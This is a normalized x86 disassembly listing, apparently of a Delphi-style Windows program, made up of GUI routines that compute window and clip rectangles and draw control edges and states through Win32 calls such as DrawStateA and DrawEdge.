push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_424c70
retn
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov eax [ eax + 0x68 ]
mov edx 0xffffffce
call sub_46ec74
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x84
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
inc eax
push eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424ca4
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425570
push eax
call DrawStateA
sub_48708c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_476f08
xor edx edx
mov eax esi
call sub_4818c4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4870dc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetClientRect
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x20 ]
neg eax
push eax
mov eax [ ebp - 0x24 ]
neg eax
push eax
lea eax [ ebp - 0x14 ]
push eax
call OffsetRect
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push ebx
call ExcludeClipRect
mov eax [ ebp - 0x20 ]
neg eax
push eax
mov eax [ ebp - 0x24 ]
neg eax
push eax
lea eax [ ebp - 0x24 ]
push eax
call OffsetRect
xor eax eax
push ebp
push sub_487259
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx ebx
call sub_4255f0
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425260
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx 0x1
mov edx 0x1
call sub_42517c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
dec ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx 0x1
call sub_42511c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487260
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425570
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
xor edx edx
call sub_4255f0
retn
sub_487268
push ebx
mov ebx eax
mov eax ebx
call sub_476e5c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov edx [ ebx + 0x4c ]
add edx 0x2
mov eax ebx
call sub_44c02c
pop ebx
retn
mov edx 0x3
mov eax ebx
call sub_44c02c
pop ebx
retn
sub_4872a0
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax [ ebx + 0x16c ]
test eax eax
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x24 ]
cmp edx 0x20000000
je r-xdata
push esi
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x190 ]
cmp eax [ ebx + 0x172 ]
jle r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
push esi
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x190 ]
cmp eax [ ebx + 0x172 ]
jle r-xdata
xor eax eax
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x198 ]
add eax 0x3
mov [ esp + 0x8 ] eax
sub eax 0x3
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x34 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebx + 0x1ac ]
call sub_48254c
call sub_47f734
mov edx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
mov eax 0x2c
mov [ esp + 0x8 ] eax
sub eax [ esp ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x16c ]
call sub_47f37c
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov edx esp
mov eax ebx
call sub_482b7c
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x74 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
cmp [ ebx + 0x18a ] 0x0
je r-xdata
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_482b7c
cmp [ ebx + 0x18a ] 0x0
je r-xdata
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
dec [ esi + 0x8 ]
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_4250a4
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_4250e0
sub_487454
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x16c ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax esi
call sub_47ecd0
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebx ]
mov ecx esi
add ecx 0x14
mov eax esi
dec eax
mov edx 0x1
call sub_417298
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425260
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
add [ ebp - 0x14 ] 0x2
inc [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_482c8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_424c70
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
push 0x1
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
add edx 0x3
mov eax [ ebx ]
add eax 0x6
call sub_41725c
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ecx 0x2
call sub_46efa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebx ]
mov ecx esi
add ecx 0x14
mov eax esi
dec eax
mov edx 0x1
call sub_417298
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4250a4
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425260
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx 0x12
mov edx 0x1
mov eax 0x1
call sub_417298
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4250a4
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425260
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
push 0x1
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4c ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47ecd0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_4193b8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2ac ]
call sub_4840c8
mov eax [ eax + 0x210 ]
call sub_47d6b0
pop edx
call sub_47df90
cmp [ eax + 0x30 ] 0x0
je r-xdata
dec edx
mov eax [ ebp - 0x28 ]
add eax 0x5
call sub_41725c
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ecx 0x2
call sub_46efa8
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4877e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_424c70
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov ebx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov edx [ eax + 0x58 ]
mov eax [ ebx + 0x38 ]
mov ecx [ ebp - 0x18 ]
call sub_45a4d8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_424c70
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x84
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
add eax 0x2
push eax
mov eax [ ebp - 0x14 ]
add eax 0x3
push eax
push 0x0
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424ca4
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425570
push eax
call DrawStateA
sub_487948
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax [ ebx + 0x160 ]
mov ecx [ eax + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e08
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x160 ]
mov ecx [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424dc0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_487aa3
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0x160 ]
call sub_4250a4
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_44c214
push 0x1
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawEdge
push 0x4
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawEdge
mov eax esi
call sub_47f37c
test al al
je r-xdata
mov eax [ ebx + 0x160 ]
mov edx 0x20
call sub_42517c
mov eax ebx
call sub_44c2bc
sar eax 0x1
jns r-xdata
adc ecx 0x0
cmp [ ebx + 0x1a0 ] 0x0
jne r-xdata
push eax
mov eax ebx
call sub_44c278
mov edx eax
mov eax [ ebx + 0x160 ]
pop ecx
call sub_42511c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487aaa
mov eax [ ebp - 0x8 ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
adc eax 0x0
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424d8c
jmp r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_424990
mov eax ebx
call sub_44c2bc
mov ecx eax
sar ecx 0x1
jns r-xdata
sub_487ab0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_4044e8
xor eax eax
push ebp
push sub_487bb8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4040d0
mov edi [ ebx + 0x30 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
lea eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4040d0
push 0x0
push 0x6
push esi
call OffsetRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_4244a4
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x50 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_4244a4
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_40463c
test eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_478dd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487bbf
lea eax [ ebp - 0x8 ]
call sub_404038
lea eax [ ebp + 0x8 ]
call sub_404038
retn
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_40463c
mov edx eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
call sub_404598
sub_487bcb
inc [ ecx ]
add [ eax ] al
add [ esi ] ah
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
cmp [ ebx + 0x1ab ] 0x0
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x1ab ] 0x0
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425260
mov edx esi
mov eax ebx
call sub_470de0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
sub_487c88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_487cad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487cb4
retn
sub_487d80
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax esi
call sub_47d670
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ r-xdata ]
jmp r-xdata
mov eax esi
call sub_47eb64
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax [ r-xdata ]
jmp r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ r-xdata ]
jmp r-xdata
mov eax esi
call sub_47eb64
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ r-xdata ]
mov eax [ sub_484788 ]
jmp r-xdata
mov eax [ sub_484788 ]
jmp r-xdata
mov eax esi
call sub_47d690
mov edx [ ebx + 0x2c4 ]
cmp eax [ edx + 0x31c ]
je r-xdata
mov eax [ r-xdata ]
pop esi
pop ebx
retn
mov eax [ r-xdata ]
jmp r-xdata
sub_487e70
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403434
test al al
je r-xdata
mov eax [ r-xdata ]
pop ebx
retn
mov eax [ r-xdata ]
pop ebx
retn
sub_487ec1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_487eff
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487f06
mov eax [ rw-data ]
call sub_4797d4
mov eax [ rw-data ]
call sub_4032a8
sub_487f08
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_487f6f
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487f76
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ rw-data ] eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40408c
mov eax [ rw-data ]
call sub_479740
sub_488460
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
mov edx [ rw-data ]
call sub_403434
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov ecx esi
mov edx edi
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_488490
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4884b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_446124
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48851a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_459818
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
mov ebx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48859c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4885c4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_488628
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_42c2c4
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_42c25c
sub_48864c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ rw-data ]
xor edx edx
mov eax ebx
call sub_420f48
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c0bc
mov [ ebx + 0x30 ] eax
mov eax [ esi ]
mov [ eax + 0xc4 ] ebx
mov [ eax + 0xc0 ] sub_488900
mov eax [ esi ]
mov [ eax + 0xcc ] ebx
mov [ eax + 0xc8 ] sub_48897c
mov eax [ esi ]
mov [ eax + 0x114 ] ebx
mov [ eax + 0x110 ] sub_4889f8
mov eax [ esi ]
mov [ eax + 0x10c ] ebx
mov [ eax + 0x108 ] sub_488a6c
mov eax [ esi ]
mov [ eax + 0xd4 ] ebx
mov [ eax + 0xd0 ] sub_488ae0
mov eax [ esi ]
mov [ eax + 0xf4 ] ebx
mov [ eax + 0xf0 ] sub_488b9c
mov eax [ esi ]
mov [ eax + 0xfc ] ebx
mov [ eax + 0xf8 ] sub_488c38
mov eax [ esi ]
mov [ eax + 0x104 ] ebx
mov [ eax + 0x100 ] sub_488cac
mov eax [ esi ]
mov [ eax + 0xdc ] ebx
mov [ eax + 0xd8 ] sub_488d28
mov eax [ esi ]
mov [ eax + 0x11c ] ebx
mov [ eax + 0x118 ] sub_488da4
mov eax [ esi ]
mov [ eax + 0x124 ] ebx
mov [ eax + 0x120 ] sub_488e18
mov eax [ esi ]
mov [ eax + 0x134 ] ebx
mov [ eax + 0x130 ] sub_488f08
mov eax [ esi ]
mov [ eax + 0x12c ] ebx
mov [ eax + 0x128 ] sub_488e8c
mov eax [ esi ]
mov [ eax + 0x13c ] ebx
mov [ eax + 0x138 ] sub_488f88
mov eax [ esi ]
mov [ eax + 0xe4 ] ebx
mov [ eax + 0xe0 ] sub_489078
mov eax [ esi ]
mov [ eax + 0xec ] ebx
mov [ eax + 0xe8 ] sub_4890ec
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4887c4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc0 ] ecx
mov [ edx + 0xc4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc8 ] ecx
mov [ edx + 0xcc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x110 ] ecx
mov [ edx + 0x114 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x108 ] ecx
mov [ edx + 0x10c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd0 ] ecx
